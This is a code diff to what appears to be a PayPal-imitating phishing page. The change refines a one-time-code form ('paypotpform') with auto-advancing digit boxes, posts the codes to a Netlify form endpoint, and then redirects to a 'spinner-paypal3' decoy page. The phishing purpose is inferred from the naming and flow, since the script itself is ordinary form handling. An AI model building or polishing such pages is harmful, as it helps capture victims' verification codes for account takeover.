@@ -218,25 +218,50 @@ ul.priorityCountries li:first-child a:hover {
 <button class="button actionContinue" type="button" id="resendOtpBtn" style="background-color: white; color: black;" disabled="">Resend Code</button>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
+    const otpInputs = document.querySelectorAll('.otp-container input[type="text"]');
     const form = document.getElementById('paypotpform');
 
+    // Move focus to next input
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+        });
+    });
+
+    // Check if all inputs are filled
+    function allInputsFilled() {
+        return [...otpInputs].every(input => input.value);
+    }
+
+    // Submit form with AJAX
     form.addEventListener('submit', function(event) {
-        event.preventDefault(); // Prevent the default form submission
+        event.preventDefault();
+        
+        if (!allInputsFilled()) {
+            console.log('Please fill in all fields.');
+            return;
+        }
 
         const formData = new FormData(form);
-        
-        // Use the Netlify form handling endpoint
-        fetch('/', { 
+        // Convert FormData to a query string
+        const searchParams = new URLSearchParams();
+        for (const pair of formData) {
+            searchParams.append(pair[0], pair[1]);
+        }
+
+        fetch('/', {
             method: 'POST',
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: new URLSearchParams(formData).toString()
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: searchParams
         })
         .then(response => {
             if (response.ok) {
-                // Redirect on successful submission
                 window.location.href = "/spinner-paypal3.html";
             } else {
-                throw new Error('Form submission failed');
+                console.error('Form submission failed');
             }
         })
         .catch(error => console.error('Error:', error));
